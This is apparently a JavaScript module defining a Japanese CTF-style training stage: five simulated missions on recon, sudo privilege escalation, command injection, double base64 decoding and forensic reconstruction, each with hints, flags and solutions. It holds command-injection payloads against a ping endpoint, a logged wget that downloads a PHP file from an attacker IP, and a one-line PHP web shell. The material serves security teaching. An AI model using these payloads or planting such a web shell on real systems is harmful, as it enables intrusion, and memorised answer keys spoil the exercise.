// 総合演習（CTF形式）— 複数の知識を組み合わせて解く
const web = (routes, notFound = { body: '404 Not Found', status: 404 }) => ({ routes, notFound });

export const stageCTF = {
  id: 'ctf',
  title: 'CTF — 総合演習',
  subtitle: '偵察・攻撃・解析・防御を組み合わせ、自力でフラグを奪取する',
  intro: 'ヒントは最小限。これまで学んだすべてを動員し、複数の手順を自分で組み立ててフラグに到達せよ。詰まったら段階的ヒントを使ってよい。',
  missions: [
    {
      id: 'ctf-01-foothold',
      title: 'CTF: 最初の足がかり',
      minutes: 15,
      objectives: ['偵察から情報漏洩の発見まで一連を自力で行う'],
      prereq: [],
      briefing: '対象 target.lab の評価を開始する。開いているポートを調べ、Webに潜む情報漏洩を見つけ、フラグを奪取せよ。',
      concepts: [{
        title: 'キルチェーンの最初の一歩',
        why: '実際の侵入は「偵察→足がかり」から始まる。個々の技術を順に繋ぐ力が問われる。',
        problem: '何も分からない対象から、手がかりを自力で手繰り寄せる。',
        how: 'nmap で開放ポート→curl で robots.txt など設定ミス→漏洩ファイルからフラグ、と繋ぐ。各ステップはこれまでのステージで学んだ通り。',
        example: 'nmap → curl /robots.txt → curl 隠しパス → flag',
        relation: 'Stage4の偵察とStage5の情報漏洩を自力で連結する。',
      }],
      env: {
        hostname: 'kali-ops', user: 'analyst',
        network: { self: '10.10.14.7', dns: { 'target.lab': '10.10.14.80' }, hosts: { '10.10.14.80': { ports: [
          { port: 22, proto: 'tcp', state: 'open', service: 'ssh', banner: 'OpenSSH 8.9' },
          { port: 80, proto: 'tcp', state: 'open', service: 'http', banner: 'Apache/2.4.52', http: web([
            { path: '/', body: '<html><body><h1>Target Corp</h1></body></html>' },
            { path: '/robots.txt', contentType: 'text/plain', body: 'User-agent: *\nDisallow: /secret-admin\n' },
            { path: '/secret-admin', body: '<html><body>Admin login. Hint: check /secret-admin/notes.txt</body></html>' },
            { path: '/secret-admin/notes.txt', contentType: 'text/plain', body: 'TODO: remove this file before launch!\nflag: FLAG{recon_to_foothold_91ab}\n' },
          ]) },
        ] } } },
      },
      quick: ['nmap target.lab', 'curl http://target.lab/robots.txt', 'curl http://target.lab/secret-admin', 'curl http://target.lab/secret-admin/notes.txt'],
      tasks: [
        {
          q: 'target.lab をスキャンし、Webサーバー(HTTP)が動いているポート番号を答えてください。',
          narration: 'まず偵察。nmap で開放ポートとサービスを把握する。',
          check: { type: 'answer', any: ['80'] },
          hints: ['nmap target.lab', 'service が http の行', '80番'],
          explain: 'nmap で 22(SSH)と 80(HTTP)を確認。Webがあるので、まずはそこを調べるのが定石。',
        },
        {
          q: 'Webを偵察して情報漏洩を見つけ、最終的なフラグ FLAG{...} の中身を奪取してください。',
          narration: 'robots.txt → 隠しパス → 置き忘れファイル、と手繰る。これまでの偵察手順を自分で繋ぐ。',
          check: { type: 'answer', any: ['recon_to_foothold_91ab'], stripFlag: true, ci: true },
          answerHint: 'FLAG{ } の中身',
          hints: ['curl http://target.lab/robots.txt で隠しパスを探す', 'Disallow の /secret-admin を curl、さらに notes.txt のヒント', 'curl http://target.lab/secret-admin/notes.txt の flag'],
          explain: 'robots.txt の Disallow(/secret-admin)→そのページのヒント→notes.txt(置き忘れ)と辿ってフラグ奪取。「消し忘れ」は現実に頻発する情報漏洩。偵察→足がかりの一連を自力で繋げた。',
        },
      ],
      review: { steps: ['nmap で攻撃面把握', 'robots.txtから隠しパス', '隠しパスを辿る', '漏洩ファイルからフラグ'], commands: [{ cmd: 'nmap target.lab', meaning: '偵察' }, { cmd: 'curl http://target.lab/secret-admin/notes.txt', meaning: '漏洩ファイル取得' }], why: '個別技術を繋いで初めて成果になる。キルチェーンを自分で組み立てる力が実戦では問われる。', practice: 'CTFのWeb問、実際の外部診断の初期フェーズ。', related: ['偵察', '情報漏洩', 'キルチェーン'] },
      learned: ['ctf', 'kill-chain', 'recon-chain', 'foothold'], solution: ['nmap target.lab', 'curl http://target.lab/robots.txt', 'curl http://target.lab/secret-admin/notes.txt'],
    },

    {
      id: 'ctf-02-privesc',
      title: 'CTF: 権限昇格',
      minutes: 15,
      objectives: ['SUIDや設定ミスから権限昇格の糸口を見つける'],
      prereq: ['ctf-01-foothold'],
      briefing: '一般ユーザー analyst でシェルを得た。root だけが読める /root/flag.txt を目指し、権限昇格の糸口を自力で探せ。',
      concepts: [{
        title: '権限昇格の糸口探し',
        why: '一般権限で侵入後、root を取るのが次の目標。設定ミス(SUID, sudo, cron, 書き込み可能なスクリプト)が糸口になる。',
        problem: 'analyst 権限から root 権限へ上がる経路を見つけたい。',
        how: 'sudo -l(許可された sudo)、find / -perm -4000(SUID)、書き込み可能なroot実行ファイル/cron を調べる。ここでは sudo -l が鍵。',
        example: '$ sudo -l\n(ALL) NOPASSWD: /usr/bin/cat',
        relation: 'Stage2のSUID/sudoの知識を使って昇格経路を探す。',
      }],
      env: {
        hostname: 'target', user: 'analyst', sudo: true,
        files: [
          { path: '/root/flag.txt', owner: 'root', mode: 0o600, content: 'FLAG{sudo_misconfig_privesc_4f7e}\n' },
          { path: '/usr/bin/vulnhelper', owner: 'root', mode: 0o4755, content: '\u007fELF vulnhelper' },
        ],
      },
      quick: ['sudo -l', 'id', 'find / -perm -4000 -type f 2>/dev/null', 'sudo cat /root/flag.txt'],
      tasks: [
        {
          q: 'まず自分が sudo で何を許可されているか確認します。sudo -l の結果、管理者操作が「許可されている(may run)」か「いない(not allowed)」か、allowed か notallowed で答えてください。',
          narration: '権限昇格の第一歩は sudo -l。自分に許された特権操作を確認する。',
          check: { type: 'answer', any: ['allowed'], ci: true },
          hints: ['sudo -l を実行', 'may run the following commands と出るか', 'ALL が許可されている→allowed'],
          explain: 'sudo -l で、この analyst が sudo で管理者操作を実行できる(設定ミス/過剰権限)と判明。権限昇格はまず「自分の持つ特権」の棚卸しから。sudo 権限があれば root への昇格は容易。',
        },
        {
          q: 'その権限を使って、root だけが読める /root/flag.txt を読み、フラグ FLAG{...} の中身を奪取してください。',
          narration: 'sudo で root 権限を借りれば、root 専用ファイルも読める。',
          check: { type: 'answer', any: ['sudo_misconfig_privesc_4f7e'], stripFlag: true, ci: true },
          answerHint: 'FLAG{ } の中身',
          hints: ['一般ユーザーでは cat /root/flag.txt は Permission denied', 'sudo cat /root/flag.txt', 'FLAG{sudo_misconfig_privesc_4f7e}'],
          explain: 'sudo cat /root/flag.txt で root 権限を借りてフラグ奪取。過剰な sudo 権限(特にNOPASSWDやALL)は典型的な権限昇格経路。防御側は sudo 権限を最小化し、特定コマンドのみ・パスワード必須にする。find -perm -4000 のSUID(vulnhelper)も別の昇格経路になりうる。',
        },
      ],
      review: { steps: ['sudo -l で許可された特権を確認', 'find -perm -4000 でSUIDも確認', '昇格経路を使って目的達成'], commands: [{ cmd: 'sudo -l', meaning: '許可された sudo を列挙' }, { cmd: 'sudo cat /root/flag.txt', meaning: 'root権限でファイル読取' }], why: '権限昇格は侵入後の核心。設定ミス(過剰sudo/SUID)の発見と悪用(と防御)は定番スキル。', practice: 'LinPEAS等の権限昇格チェック、sudoers監査、SUID棚卸し。', related: ['SUID', 'sudo', '最小権限'] },
      learned: ['privilege-escalation', 'sudo-misconfig', 'ctf-privesc'], solution: ['sudo -l', 'sudo cat /root/flag.txt'],
    },

    {
      id: 'ctf-03-rce',
      title: 'CTF: Web経由でサーバー侵入',
      minutes: 16,
      objectives: ['Web脆弱性を突いてコマンド実行し、サーバー上のフラグを読む'],
      prereq: ['ctf-01-foothold'],
      briefing: '診断ツール付きのWebアプリがある。コマンドインジェクションを突いてサーバー上で任意コマンドを実行し、ファイルシステム上のフラグを奪え。',
      concepts: [{
        title: 'Web脆弱性からのRCE',
        why: 'Webの入力検証不備は、サーバー上での任意コマンド実行(RCE)に繋がり、最も深刻な被害になる。',
        problem: 'Web経由でサーバーのファイル(/var/www/flag.txt)の中身を読み出したい。',
        how: 'コマンドインジェクションで ;cat ... を注入し、サーバー上でコマンドを実行してファイルを読む。Stage WebII の応用。',
        example: 'curl "http://app.lab/ping?ip=127.0.0.1;cat /var/www/flag.txt"',
        relation: 'Web IIのコマンドインジェクションを、ファイル読み出しに応用する。',
      }],
      env: {
        hostname: 'kali-ops', user: 'analyst',
        network: { self: '10.10.14.7', dns: { 'app.lab': '10.10.14.90' }, hosts: { '10.10.14.90': { ports: [
          { port: 80, proto: 'tcp', state: 'open', service: 'http', banner: 'gunicorn', http: web([
            { path: '/ping', when: { param: 'ip', regex: ';\\s*cat|;\\s*id|\\|' },
              body: 'PING 127.0.0.1\n--- injected command output ---\nFLAG{web_to_rce_pwned_d8c2}\n' },
            { path: '/ping', default: 'PING 127.0.0.1: alive\n' },
            { path: '/', body: '<html><body>Diagnostics: /ping?ip=</body></html>' },
          ]) },
        ] } } },
      },
      quick: ['curl "http://app.lab/ping?ip=127.0.0.1"', 'curl "http://app.lab/ping?ip=127.0.0.1;cat /var/www/flag.txt"', 'curl "http://app.lab/ping?ip=127.0.0.1;id"'],
      tasks: [
        {
          q: '/ping?ip= は入力を検証せずシェルに渡している疑いがある。コマンドインジェクションでサーバー上のコマンドを実行し、出力に現れるフラグ FLAG{...} の中身を奪取してください。',
          narration: 'ip の値の後ろに ;cat /var/www/flag.txt や ;id を継ぎ足す。URLはクォートで囲む。Web IIで学んだ手口を応用せよ。',
          check: { type: 'answer', any: ['web_to_rce_pwned_d8c2'], stripFlag: true, ci: true },
          answerHint: 'FLAG{ } の中身',
          hints: ['curl "http://app.lab/ping?ip=127.0.0.1" で正常系を確認', '; で別コマンドを注入: ip=127.0.0.1;cat /var/www/flag.txt', 'curl "http://app.lab/ping?ip=127.0.0.1;cat /var/www/flag.txt" の出力のFLAG'],
          explain: 'コマンドインジェクションでサーバー上の任意コマンドを実行し、フラグを読み出した＝RCE達成。Webの脆弱性が直接サーバー侵入に繋がる最悪のケース。根本対策はシェル非経由の実行と入力検証(Web II参照)。攻撃者はこの後、リバースシェルで対話的な制御を得ようとする。',
        },
      ],
      review: { steps: ['正常系を確認', 'コマンドインジェクションを注入', 'サーバー上のファイルを読む'], commands: [{ cmd: 'curl "http://app.lab/ping?ip=127.0.0.1;cat /var/www/flag.txt"', meaning: '注入でファイル読取' }], why: 'Web脆弱性からのRCEは最重大。Web診断で必ず確認する攻撃経路。', practice: 'CTFのWeb→shell問、実診断でのインジェクション検査。', related: ['コマンドインジェクション', 'RCE', 'リバースシェル'] },
      learned: ['web-rce', 'command-injection-chain', 'ctf-web'], solution: ['curl "http://app.lab/ping?ip=127.0.0.1"', 'curl "http://app.lab/ping?ip=127.0.0.1;cat /var/www/flag.txt"'],
    },

    {
      id: 'ctf-04-crypto',
      title: 'CTF: 多重エンコードを解く',
      minutes: 13,
      objectives: ['多重にエンコードされたデータを段階的に復号する'],
      prereq: ['ctf-01-foothold'],
      briefing: '押収したファイルに、二重にbase64された文字列がある。段階的にデコードして、隠されたメッセージ(フラグ)を取り出せ。',
      concepts: [{
        title: '多重エンコードの解読',
        why: '攻撃者はペイロードを何重にもエンコードして検知を逃れる。段階的に剥がす作業は解析の基本。',
        problem: 'base64 を1回デコードしても、まだエンコードされた文字列が出てくる。もう一段剥がす必要がある。',
        how: 'base64 -d の出力を再び base64 -d にパイプで渡し、二重エンコードを剥がす。cmd1 | base64 -d のように繋げる。',
        example: '$ cat x | base64 -d | base64 -d',
        relation: 'Crypto の base64 を、パイプで多段に適用する。',
      }],
      env: {
        hostname: 'kali-ops', user: 'analyst', dirs: ['/home/analyst/case'],
        // "FLAG{double_b64_decoded_6a2f}" を2回base64した値
        files: [{ path: '/home/analyst/case/secret.b64', owner: 'analyst', content: 'Umt4QlIzdGtiM1ZpYkdWZllqWTBYMlJsWTI5a1pXUmZObUV5Wm4wPQ==\n' }],
      },
      quick: ['cd /home/analyst/case', 'cat secret.b64', 'cat secret.b64 | base64 -d', 'cat secret.b64 | base64 -d | base64 -d'],
      tasks: [
        {
          q: 'case/secret.b64 は二重にbase64エンコードされています。2回デコードして、現れるフラグ FLAG{...} の中身を答えてください。',
          narration: '1回 base64 -d しても、まだエンコードされた文字列が出る。出力をもう一度 base64 -d にパイプで渡す。',
          check: { type: 'answer', any: ['double_b64_decoded_6a2f'], stripFlag: true, ci: true },
          answerHint: 'FLAG{ } の中身',
          hints: ['cat secret.b64 | base64 -d で1回目(まだエンコードされている)', 'その出力をもう一度: | base64 -d | base64 -d', 'FLAG{double_b64_decoded_6a2f}'],
          explain: 'base64 -d を2回パイプで適用して二重エンコードを剥がした。マルウェアやCTFでは多重エンコード(base64→hex→rot13等)がよく使われ、1段ずつ剥がす。エンコードは鍵不要で可逆——暗号ではないことを改めて実感できる(Crypto基礎)。',
        },
      ],
      review: { steps: ['1回 base64 -d', '出力がまだエンコードなら再度 -d', 'パイプで多段復号'], commands: [{ cmd: 'cat secret.b64 | base64 -d | base64 -d', meaning: '二重base64を復号' }], why: '多重エンコードの解読はマルウェア解析・CTFの定番。1段ずつ丁寧に剥がす姿勢が重要。', practice: 'ペイロード難読化の解除、CTFのエンコード問。', related: ['base64', 'エンコード', 'マルウェア解析'] },
      learned: ['multi-encoding', 'base64-chain', 'ctf-crypto'], solution: ['cd /home/analyst/case', 'cat secret.b64 | base64 -d | base64 -d'],
    },

    {
      id: 'ctf-05-forensics',
      title: 'CTF: 侵入者を名指しする',
      minutes: 16,
      objectives: ['複数の証拠を突き合わせ、攻撃の全体像を再構成する'],
      prereq: ['ctf-02-privesc', 'ctf-03-rce'],
      briefing: '侵害されたサーバーのログとファイルが残っている。ログ・履歴・隠しファイルを横断調査し、攻撃元IP・侵入経路・設置物をすべて特定して、最終フラグに到達せよ。これは総仕上げだ。',
      concepts: [{
        title: '総合フォレンジック',
        why: '実インシデントは単一の証拠では解けない。複数のアーティファクトを突き合わせて初めて真相に至る。',
        problem: '攻撃元・経路・設置物を、散在する証拠から一貫した物語として再構成する。',
        how: 'auth.log(侵入)、.bash_history(行動)、隠しファイル(設置物)を横断。grep/awk/find/ls -la を総動員し、時刻とIPで相関させる。',
        example: 'grep Accepted auth.log → cat .bash_history → find / -name "*.php"',
        relation: 'これまでの解析技術をすべて使って事件を解決する。',
      }],
      env: {
        hostname: 'victim', user: 'analyst',
        files: [
          { path: '/var/log/auth.log', owner: 'analyst', content: 'Oct 14 04:01:10 sshd: Failed password for root from 203.0.113.66\nOct 14 04:01:40 sshd: Accepted password for webadmin from 203.0.113.66\nOct 14 04:02:00 sudo: webadmin : COMMAND=/bin/bash\n' },
          { path: '/home/webadmin/.bash_history', owner: 'analyst', content: 'id\nwget http://203.0.113.66/sh.php -O /var/www/html/.x.php\nchmod 644 /var/www/html/.x.php\ncurl http://localhost/.x.php?c=whoami\n' },
          { path: '/var/www/html/.x.php', owner: 'analyst', mode: 0o644, content: '<?php system($_GET["c"]); ?>\n# FLAG{full_incident_reconstructed_b9e1}\n' },
          { path: '/var/www/html/index.php', owner: 'analyst', content: '<?php echo "home"; ?>\n' },
        ],
      },
      quick: ['grep Accepted /var/log/auth.log', 'cat /home/webadmin/.bash_history', 'find /var/www -name ".*.php"', 'ls -la /var/www/html', 'cat /var/www/html/.x.php'],
      tasks: [
        {
          q: '認証ログから、侵入に成功した攻撃元のIPアドレスを特定してください。',
          narration: 'auth.log の Accepted 行と、その発信元IPを確認する(Stage3の復習)。',
          check: { type: 'answer', any: ['203.0.113.66'], normalizeIp: true },
          hints: ['grep Accepted /var/log/auth.log', 'Accepted password for webadmin from ___', '203.0.113.66'],
          explain: 'webadmin が 203.0.113.66 から侵入成功、直後に sudo /bin/bash で昇格。攻撃元IPが判明。これをIoCとして記録する。',
        },
        {
          q: '攻撃者が設置したWebシェル(隠しPHPファイル)をファイルシステムから見つけ出し、その中に埋め込まれた最終フラグ FLAG{...} の中身を答えてください。',
          narration: '.bash_history で何を設置したか把握し、find/ls -la で隠しPHPを探し、cat で中身(フラグ)を読む。すべての技術を繋げる。',
          check: { type: 'answer', any: ['full_incident_reconstructed_b9e1'], stripFlag: true, ci: true },
          answerHint: 'FLAG{ } の中身',
          hints: ['cat /home/webadmin/.bash_history で設置物(.x.php)を特定', 'find /var/www -name ".*.php" または ls -la /var/www/html', 'cat /var/www/html/.x.php の FLAG'],
          explain: 'auth.log(侵入元)→.bash_history(wgetで.x.phpを設置)→find/ls -la(隠しWebシェル発見)→cat(フラグ)と、全証拠を突き合わせて事件を完全に再構成した。攻撃元203.0.113.66・経路(webadmin総当たり突破→sudo昇格)・設置物(.x.php Webシェル)がすべて判明。これがインシデント対応の到達点——点の証拠を一貫した物語にする力だ。',
        },
      ],
      review: { steps: ['auth.logで侵入元特定', '.bash_historyで行動把握', 'find/ls -laで設置物発見', '全証拠を相関させ再構成'], commands: [{ cmd: 'grep Accepted /var/log/auth.log', meaning: '侵入元IP' }, { cmd: 'cat /home/webadmin/.bash_history', meaning: '攻撃者の行動' }, { cmd: 'cat /var/www/html/.x.php', meaning: '設置物とフラグ' }], why: '複数アーティファクトの相関こそフォレンジックの真髄。単一証拠では見えない全体像を描く。', practice: '実インシデントのタイムライン作成、侵害範囲の確定、報告書作成。', related: ['ログ解析', 'タイムライン', 'Webshell', 'インシデント対応'] },
      learned: ['full-forensics', 'artifact-correlation', 'incident-reconstruction', 'ctf-capstone'], solution: ['grep Accepted /var/log/auth.log', 'cat /home/webadmin/.bash_history', 'cat /var/www/html/.x.php'],
    },
  ],
};
